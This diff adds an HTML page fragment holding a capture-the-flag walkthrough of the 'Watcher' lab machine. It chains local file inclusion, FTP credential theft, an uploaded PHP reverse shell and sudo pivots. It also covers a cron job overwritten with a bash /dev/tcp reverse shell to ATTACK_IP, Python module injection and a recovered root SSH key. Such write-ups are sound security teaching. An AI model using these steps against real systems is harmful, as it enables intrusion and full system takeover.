@@ -1,0 +1,82 @@
+<!--
+  writeups/watcher.html - content fragment (loaded into the modal)
+  New writeup? Copy writeups/template.html -> writeups/<slug>.html.
+-->
+<h2>Watcher — LFI to Root in 7 Flags</h2>
+<p>A boot2root with a long, linear privilege chain: LFI turns into a webshell, then a series of sudo/cron pivots, ending with a root SSH key. Goal: 7 flags.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-func">nmap</span> -sC -sV watcher.thm
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp    vsftpd 3.0.3
+22/tcp open  ssh
+80/tcp open  http   Apache</code></pre>
+
+<h3>2 · LFI → FTP Credentials</h3>
+<p><code>post.php</code> does a raw <code>include $_GET["post"]</code> — instant LFI. Use it to read <code>robots.txt</code>, which points to <code>secret_file_do_not_read.txt</code>, which leaks FTP credentials and the upload path.</p>
+<pre><code><span class="tok-comment"># Any file, no filtering</span>
+http://watcher.thm/post.php?post=<span class="tok-string">/etc/passwd</span>
+
+<span class="tok-comment"># robots → secret file → FTP creds</span>
+http://watcher.thm/post.php?post=robots.txt
+<span class="tok-comment"># Allow: /flag_1.txt | Allow: /secret_file_do_not_read.txt</span>
+http://watcher.thm/post.php?post=secret_file_do_not_read.txt
+<span class="tok-comment"># &gt; ftpuser : &lt;password&gt; — files go to /home/ftpuser/ftp/files</span></code></pre>
+
+<h3>3 · FTP Upload → Reverse Shell</h3>
+<p>Log into FTP: grab <code>flag_2.txt</code>, then <code>put</code> a PHP reverse shell into the writable <code>files/</code> directory. Trigger it through the LFI using the path from the note.</p>
+<pre><code><span class="tok-func">ftp</span> watcher.thm
+&gt; get flag_2.txt
+&gt; cd files
+&gt; put shell.php
+
+<span class="tok-comment"># Listener + trigger via LFI</span>
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
+http://watcher.thm/post.php?post=<span class="tok-string">../../../../home/ftpuser/ftp/files/shell.php</span>
+<span class="tok-comment"># &gt; shell as www-data — flag_3.txt in /var/www/html/more_secrets_a9f10a/</span></code></pre>
+
+<h3>4 · www-data → toby</h3>
+<pre><code><span class="tok-comment"># Passwordless sudo to toby</span>
+<span class="tok-func">sudo</span> -u toby /bin/bash
+<span class="tok-comment"># &gt; toby shell — flag_4.txt in /home/toby</span></code></pre>
+
+<h3>5 · toby → mat (cron poisoning)</h3>
+<p><code>/etc/crontab</code> runs <code>/home/toby/jobs/cow.sh</code> as user <code>mat</code> every minute. As toby we can overwrite it with a reverse shell and wait.</p>
+<pre><code><span class="tok-func">cat</span> /etc/crontab
+<span class="tok-comment"># * * * * * mat /home/toby/jobs/cow.sh</span>
+
+<span class="tok-func">echo</span> <span class="tok-string">'/bin/bash -i &gt;&amp; /dev/tcp/ATTACK_IP/5555 0&gt;&amp;1'</span> &gt; /home/toby/jobs/cow.sh
+<span class="tok-func">chmod</span> +x /home/toby/jobs/cow.sh
+<span class="tok-comment"># &gt; wait a minute → mat shell → flag_5.txt</span></code></pre>
+
+<h3>6 · mat → will (module injection)</h3>
+<p>Will left a note: mat may run <code>will_script.py</code> as will via sudo. It imports <code>get_command</code> from a local <code>cmd.py</code> that mat can edit — override the function to drop a shell while still returning a whitelisted command.</p>
+<pre><code><span class="tok-func">sudo</span> -l
+<span class="tok-comment"># (will) /usr/bin/python3 /home/mat/scripts/will_script.py</span>
+
+<span class="tok-func">cat</span> &gt; /home/mat/scripts/cmd.py &lt;&lt; <span class="tok-string">'EOF'</span>
+<span class="tok-keyword">import</span> os
+<span class="tok-keyword">def</span> <span class="tok-func">get_command</span>(num):
+    os.system(<span class="tok-string">"/bin/bash -i"</span>)
+    <span class="tok-keyword">return</span> <span class="tok-string">"id"</span>
+EOF
+
+<span class="tok-func">sudo</span> -u will /usr/bin/python3 /home/mat/scripts/will_script.py <span class="tok-num">1</span>
+<span class="tok-comment"># &gt; will shell — flag_6.txt</span></code></pre>
+
+<h3>7 · will → root (base64 SSH key)</h3>
+<p>User <code>will</code> is in the <code>adm</code> group, which can read <code>/opt/backups/</code>. Inside is <code>key.b64</code> — decode it and it's an RSA private key for root.</p>
+<pre><code><span class="tok-func">id</span>
+uid=<span class="tok-num">1000</span>(will) groups=<span class="tok-num">1000</span>(will),<span class="tok-num">4</span>(adm)
+
+<span class="tok-func">ls</span> /opt/backups
+key.b64
+
+<span class="tok-func">base64</span> -d key.b64 &gt; key
+<span class="tok-func">file</span> key   <span class="tok-comment"># PEM RSA private key</span>
+<span class="tok-func">chmod</span> <span class="tok-num">600</span> key
+<span class="tok-func">ssh</span> -i key root@localhost
+<span class="tok-comment"># &gt; root — final flag</span></code></pre>
+
+<h3>8 · Retrospective</h3>
+<p>Attack chain: LFI → FTP creds → uploaded PHP shell → sudo/cron pivots (www-data→toby→mat→will) → base64 root key. Lessons: raw <code>include</code> is a shell factory, cron scripts must not be world-writable, and running python <code>while</code> importing a file your users can edit is a root factory.</p>
